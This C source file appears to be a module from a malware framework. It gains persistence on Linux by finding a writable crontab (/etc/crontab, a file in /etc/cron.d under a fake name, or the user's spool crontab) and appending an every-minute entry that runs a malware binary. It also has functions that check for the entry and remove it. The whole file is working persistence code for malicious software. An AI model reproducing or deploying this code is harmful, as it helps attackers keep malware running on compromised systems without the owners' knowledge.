#pragma region RequiredLibraries

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include "../../headers/modules/module.h"
	#include "../../headers/helpers/helpers.h"
	#include "../../headers/errors/codes.h"

#pragma endregion

#pragma region Configuration

	#define        CHECKED_FILES_COUNT               3
	#define        PACKAGES_CRONTAB_FOLDER           "/etc/cron.d"
	#define        USER_CRONTAB_FOLDER               "/var/spool/cron/crontabs"
	#define        SYSTEM_CRONTAB_FILE               "/etc/crontab"

	#define        RUN_COMMAND_BUFFER_SIZE           64
	#define        RUN_COMMAND_FORMAT                "* * * * * %s %s\n"

	#define        EMPTY_USERNAME                    " \0"

#pragma endregion

#pragma region GlobalVariables

	char *checked_files[CHECKED_FILES_COUNT] = {NULL};;
	char run_command_buffer[RUN_COMMAND_BUFFER_SIZE] = {'\0'};
	int exploitable_index = -1;

#pragma endregion

#pragma region GlobalVariablesMethods

int are_globals_inited(){

	if (run_command_buffer[0] == '\0' || checked_files[0] == NULL)
		return 1;
	else
		return 0;

}

int init_exploitable_index(ENVIRONMENT *env){

	int ret_val = 0;
	int i;

	// If root, then the exploit can be executed
	if (env->is_root)
		exploitable_index = 0;
	else{

		for (i = 0; i < CHECKED_FILES_COUNT; i++){

			// Check the privileges for the current file
			ret_val = has_privilege(checked_files[i], WRITE);
			if (ret_val >= 0){
				exploitable_index = i;
				break;
			}
		}
	
	}

	// Return
	return ret_val;

}

int init_globals(ENVIRONMENT *env){

	char *username = NULL;
	int ret_val = 1;

	// Get username
	get_username(&username);

	// Generate the checked files
	copy_string(checked_files + __COUNTER__, SYSTEM_CRONTAB_FILE, 0);
	concat_path_with_filename(checked_files + __COUNTER__, PACKAGES_CRONTAB_FOLDER, env->fake_name);
	concat_path_with_filename(checked_files + __COUNTER__, USER_CRONTAB_FOLDER, username);

	// Compose the command that will be appended
	if (strstr(checked_files[exploitable_index], USER_CRONTAB_FOLDER) != NULL)
		strcpy(username, EMPTY_USERNAME);
	ret_val = sprintf(run_command_buffer, RUN_COMMAND_FORMAT, username, env->malware_path); 
	if (ret_val < 0)
		return ERROR_OPERATING_SYSTEM_UNABLE_TO_PRINT;

	// Get the exploitable file index
	init_exploitable_index(env);

	// Return
	return 0;

}

#pragma endregion

#pragma region SharedObjectEvents

void __attribute__ ((destructor)) on_dlclose(void){

	int i;

	for (i = 0; i < CHECKED_FILES_COUNT; i++){
		if (checked_files[i])
			free(checked_files[i]);
	}

}

#pragma endregion

#pragma region ModuleMethods

extern int is_compatible(ENVIRONMENT *env){

	return init_globals(env);

}

extern int exploit(ENVIRONMENT *env){

	FILE *opened_file;

	if (!are_globals_inited())
		is_compatible(env);

	// Add line to file
	opened_file = fopen(checked_files[exploitable_index], "a");
	if (opened_file == NULL)
		return ERROR_OPERATING_SYSTEM_UNABLE_TO_OPEN_FILE;
	fputs(run_command_buffer, opened_file);
	fclose(opened_file);

	// Return
	return 0;

}

extern int is_installed(ENVIRONMENT *env){

	char *content = NULL;
	int ret_val = 0;

	// If the index is not already setted, call the method
	if (!are_globals_inited())
		is_compatible(env);

	// Get file content
	get_file_content(checked_files[exploitable_index], &content);

	// Verify if the run command is present
	if (strstr(content, run_command_buffer) != NULL){
		ret_val = 1;
	}

	// Free the content
	free(content);
	content = NULL;

	// Return
	return ret_val;

}

extern int delete_installed(ENVIRONMENT *env){

	char *content = NULL;

	// If the index is not already setted, call the method
	if (!are_globals_inited())
		is_compatible(env);

	// Get file content
	get_file_content(checked_files[exploitable_index], &content);

	// Replace the occurences of the run command
	remove_all_substring_occurences(content, run_command_buffer);
	create_file(checked_files[exploitable_index], content);

	// Free the content
	free(content);
	content = NULL;

	// Return
	return 0;

}

#pragma endregion